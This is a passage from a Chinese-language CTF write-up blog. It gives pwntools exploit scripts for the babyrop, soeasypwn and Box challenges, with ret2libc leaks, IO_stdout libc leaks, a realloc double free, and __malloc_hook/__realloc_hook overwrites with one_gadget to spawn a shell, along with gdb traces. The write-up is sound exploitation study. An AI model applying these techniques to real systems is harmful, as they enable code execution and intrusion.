lg(<span class="string">"addr"</span>, puts)</span><br><span class="line">    libc.address = puts - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    new(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    payload = <span class="string">"/bin/sh;#\x00"</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">"a"</span>)</span><br><span class="line">    payload += p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#free(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>简单</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'192.25.1.3'</span> </span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./1910245db1406dc99ea'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = ELF(<span class="string">'./libc6_2.23-0ubuntu3_i386.so'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="string">"a"</span>*<span class="number">0x20</span>,</span><br><span class="line">        p32(<span class="number">0x66666666</span>)</span><br><span class="line">    ])</span><br><span class="line">    sl(payload)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="string">"a"</span>*<span class="number">0x14</span>,</span><br><span class="line">        elf.plt[<span class="string">'puts'</span>],</span><br><span class="line">        p32(<span class="number">0x804853d</span>),</span><br><span class="line">        elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    ])</span><br><span class="line">    ru(<span class="string">"What is your name?"</span>)</span><br><span class="line">    r(<span class="number">1</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    __libc_start_main = uu32(r(<span class="number">4</span>))</span><br><span class="line">    lg(<span class="string">"__libc_start_main"</span>, __libc_start_main)</span><br><span class="line">    libc.address = __libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    lg(<span class="string">"libc_addr"</span>, libc.address)</span><br><span class="line">    lg(<span class="string">"system"</span>, libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">    lg(<span class="string">"bin_sh"</span>, libc.search(<span class="string">"/bin/sh"</span>).next())</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="string">"a"</span>*<span class="number">0x14</span>,</span><br><span class="line">        elf.plt[<span class="string">"puts"</span>],</span><br><span class="line">        libc.symbols[<span class="string">'system'</span>],</span><br><span class="line">        elf.got[<span class="string">'__libc_start_main'</span>],</span><br><span class="line">        libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    ])</span><br><span class="line">    sla(<span class="string">"What is your name?\n"</span>, payload)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="soeasypwn"><a href="#soeasypwn" class="headerlink" title="soeasypwn"></a>soeasypwn</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">"./"</span> + <span class="string">'pwn'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line">host = <span class="string">'101.71.29.5'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb, timeout=<span class="number">1</span>)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Welcome our the "</span>)</span><br><span class="line">    leak = int(r(<span class="number">5</span>),<span class="number">10</span>)</span><br><span class="line">    lg(<span class="string">"leak"</span>, leak)</span><br><span class="line">    <span class="comment">#debug(0x902)</span></span><br><span class="line">    addr = hex(leak) + <span class="string">"19CD"</span></span><br><span class="line">    addr = int(addr, <span class="number">16</span>)</span><br><span class="line">    lg(<span class="string">"addr"</span>, addr)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0xc</span> + p32(addr) + <span class="string">'\x00'</span></span><br><span class="line">    sa(<span class="string">"So, Can you tell me your name?"</span>, payload)</span><br><span class="line">    payload = <span class="string">'\x00'</span></span><br><span class="line">    sa(<span class="string">"(1.hello|2.byebye):"</span>, payload)</span><br><span class="line">    r()</span><br><span class="line">    r()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><p>这里有个小细节，r()两次,</p><h2 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>数组index是可以输入负数的，就是不会利用,后面看了萝卜师傅的wp才知道可以直接改IO_stdout</p><p>我是傻逼！这都想不到</p><p>然后有个double free,新点记录下</p><ul><li>size == 0 ，这个时候等同于free</li><li>realloc_ptr == 0 &amp;&amp; size &gt; 0 ， 这个时候等同于malloc</li><li>malloc_usable_size(realloc_ptr) &gt;= size， 这个时候等同于edit</li><li>malloc_usable_size(realloc_ptr) &lt; szie， 这个时候才是malloc一块更大的内存，将原来的内容复制过去，再将原来的chunk给free掉</li></ul><p>所以利用这个点第一次可以用普通的</p><ol><li>free(ptr)</li><li>realloc(ptr,0)</li></ol><p>这就是double free</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol><li>利用IO_stdout泄露libc地址</li><li>利用double free改realloc为one_gadget</li></ol><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">edit(<span class="number">-12</span>, payload)</span><br><span class="line">lg(<span class="string">"text_base"</span>, text_base)</span><br><span class="line">addr = uu64(r(<span class="number">8</span>))</span><br><span class="line">libc.address = addr - <span class="number">0x18c7c2</span></span><br><span class="line"><span class="keyword">if</span> (libc.address&amp;<span class="number">0xffff</span>)%<span class="number">0x1000</span>!=<span class="number">0</span>:</span><br><span class="line"> <span class="keyword">raise</span> EOFError</span><br><span class="line"></span><br><span class="line">lg(<span class="string">"addr"</span>, addr)</span><br></pre></td></tr></table></figure><p>这里就是IO_FILE攻击，不清楚的可以自己学下，这里我学到个新操作。。我调试的时候要生要死的，没想到抛出异常，多亏大佬博客了，还有自己复现的时候用ida把前面一段打开文件那部分patch掉吧，不然感觉效率太慢了。。。</p><h4 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h4><p>这里还有个uaf</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">realloc = libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">malloc = libc.symbols[<span class="string">'__libc_malloc'</span>]</span><br></pre></td></tr></table></figure><p>这里常规操作，接下来的才是重头戏</p><h4 id="one-gadget失败"><a href="#one-gadget失败" class="headerlink" title="one_gadget失败"></a>one_gadget失败</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(<span class="number">0xAAAAAAAA</span>) </span><br><span class="line"><span class="comment">#payload = "a"*0xb + p64(malloc+0x1) + p64(libc.address + one_gadget[2])</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(malloc+<span class="number">0x2</span>) + p64(libc.address + one_gadget[<span class="number">1</span>])</span><br><span class="line">edit(<span class="number">3</span>, payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里你用payload = “a”*0xb + p64(one_gadget)你会发觉成功不了，</p><p>而malloc_hook和realloc_hook通常是一起的，所以我们可以利用这个组合达到一个目的，调整栈过后在one_gadget,具体如何往下看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x45216 execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">"/bin/sh"</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(<span class="string">"/bin/sh"</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>原因就是环境对不上，接下来讲下如何让环境对的上这个</p><ol><li><p>首先将realloc_hook覆盖成随便一个无法正常运行的地址<br>例如这种 payload = “a”*0xb + p64(0xAAAAAAAA)<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/1.png" alt="1.png"><br>成功断下</p></li><li><p>查看现在栈环境，跟上面的差别是什么</p></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x30-0x20</span><br><span class="line">0x7ffc01f8c508:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c518:	0x00007fb957514e90	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c528:	0x0000562794411ca1	0x0000000000000a31</span><br><span class="line">0x7ffc01f8c538:	0x0000000000000000	0x00007ffc01f8c580</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x30</span><br><span class="line">0x7ffc01f8c528:	0x0000562794411ca1	0x0000000000000a31</span><br><span class="line">0x7ffc01f8c538:	0x0000000000000000	0x00007ffc01f8c580</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c558:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x50</span><br><span class="line">0x7ffc01f8c548:	0x0000562794411a40	0x00007ffc01f8c680</span><br><span class="line">0x7ffc01f8c558:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">0x7ffc01f8c578:	0x0000000000000001	0x00007ffc01f8c5a0</span><br><span class="line">0x7ffc01f8c588:	0x0000562794412001	0x0000000100000000</span><br><span class="line">gdb-peda$ x/10gx <span class="variable">$rsp</span>+0x70</span><br><span class="line">0x7ffc01f8c568:	0x0000562794411d63	0x0000000094411a40</span><br><span class="line">0x7ffc01f8c578:	0x0000000000000001	0x00007ffc01f8c5a0</span><br><span class="line">0x7ffc01f8c588:	0x0000562794412001	0x0000000100000000</span><br><span class="line">0x7ffc01f8c598:	0x5c71a837f5655700	0x0000562794412050</span><br><span class="line">0x7ffc01f8c5a8:	0x00007fb9574fe830	0x0000000000000001</span><br></pre></td></tr></table></figure><p>看，上述环境没有一个符合了，那么现在该如何做呢，发觉0x10可以，0x40可以，还有0x60可以，<br>栈是往低地址生长的<br>也就是说我们只要将rsp提高0x10,就变成rsp+0x10+0x30了就可以了</p><p>调用一个函数过后通常来说栈是平衡的<br>只要我们稍微改动一下我们调用的位置就行了，比如函数头地址+4，从这里开始执行，假设绕过一个push，这样的话，就相当于pop多一个，pop多一个的话，esp会提高一个寄存器大小的位置，也就是rsp=rsp+0x8<br>利用这个特性，我们也就是说可以调整栈，让其指定位置为0</p><p>我们调整第2个one_gadget吧，让其提高0x10就可以了，怎么让其提高呢，我们可以利用malloc这个函数，因为他会调用malloc_hook，组合调用<br>我就选了malloc</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p __libc_malloc</span><br><span class="line"><span class="variable">$1</span> = &#123;void *(size_t)&#125; 0x7f4137102130 &lt;__GI___libc_malloc&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble 0x7f4137102130 </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> __GI___libc_malloc:</span><br><span class="line">   0x00007f4137102130 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00007f4137102131 &lt;+1&gt;:	push   rbx</span><br><span class="line">   0x00007f4137102132 &lt;+2&gt;:	sub    rsp,0x8</span><br><span class="line">   0x00007f4137102136 &lt;+6&gt;:	mov    rax,QWORD PTR [rip+0x33fdb3]        <span class="comment"># 0x7f4137441ef0</span></span><br><span class="line">   0x00007f413710213d &lt;+13&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00007f4137102140 &lt;+16&gt;:	<span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x00007f4137102143 &lt;+19&gt;:	jne    0x7f4137102298 &lt;__GI___libc_malloc+360&gt;</span><br><span class="line">   0x00007f4137102149 &lt;+25&gt;:	mov    rax,QWORD PTR [rip+0x33fc40]        <span class="comment"># 0x7</span></span><br></pre></td></tr></table></figure><p>看函数头，我们发觉有两个push，一个sub rsp,0x8,<br>计算下我们有0x18可控，所以我们提高0x10的话，就从+2开始就行了，<br>所以<strong>payload = “a”*0xb + p64(malloc+0x2) + p64(libc.address + one_gadget[1])</strong><br>前面的a填充过后就是realloc_hook，覆盖成malloc+0x2，所以这样让栈提高0x10,接下来是malloc函数，</p><p>具体个执行过程呢就是realloc_hook被覆盖成malloc+2了，malloc_hook被覆盖成one_gadget了，<br>所以先执行的是malloc+2,然后执行malloc_hook</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  0x7f1e223d2132 &lt;malloc+2&gt;          sub    rsp, 8</span><br><span class="line">► 0x7f1e223d2136 &lt;malloc+6&gt;          mov    rax, qword ptr [rip + 0x33fdb3] &lt;0x7f1e223d2132&gt;</span><br><span class="line">  0x7f1e223d213d &lt;malloc+13&gt;         mov    rax, qword ptr [rax]</span><br><span class="line">  0x7f1e223d2140 &lt;malloc+16&gt;         <span class="built_in">test</span>   rax, rax</span><br><span class="line">  0x7f1e223d2143 &lt;malloc+19&gt;         jne    malloc+360 &lt;0x7f1e223d2298&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x7f1e223d2298 &lt;malloc+360&gt;        mov    rsi, qword ptr [rsp + 0x18]</span><br><span class="line">  0x7f1e223d229d &lt;malloc+365&gt;        add    rsp, 8</span><br><span class="line">  0x7f1e223d22a1 &lt;malloc+369&gt;        pop    rbx</span><br><span class="line">  0x7f1e223d22a2 &lt;malloc+370&gt;        pop    rbp</span><br><span class="line">  0x7f1e223d22a3 &lt;malloc+371&gt;        jmp    rax</span><br><span class="line">   ↓</span><br><span class="line">  0x7f1e2239326a &lt;do_system+1098&gt;    mov    rax, qword ptr [rip + 0x37ec47]</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes) </span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) </span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc调用前会查看mallo_hook是否存在，存在就调用malloc_hook</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   0x00007f1e223d2130 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x00007f1e223d2131 &lt;+1&gt;:	push   rbx</span><br><span class="line">   0x00007f1e223d2132 &lt;+2&gt;:	sub    rsp,0x8</span><br><span class="line">=&gt; 0x00007f1e223d2136 &lt;+6&gt;:	mov    rax,QWORD PTR [rip+0x33fdb3]        <span class="comment"># 0x7f1e22711ef0</span></span><br><span class="line">   0x00007f1e223d213d &lt;+13&gt;:	mov    rax,QWORD PTR [rax]</span><br><span class="line">   0x00007f1e223d2140 &lt;+16&gt;:	<span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x00007f1e223d2143 &lt;+19&gt;:	jne    0x7f1e223d2298 &lt;__GI___libc_malloc+360&gt;</span><br></pre></td></tr></table></figure><p>这里就是查看malloc_hook部分，若有调到+360处</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/2.png" alt="2.png"></p><p>看，成功迁移位置</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/3.png" alt="3.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.a0yo4SjOZB/Box'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line">text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span 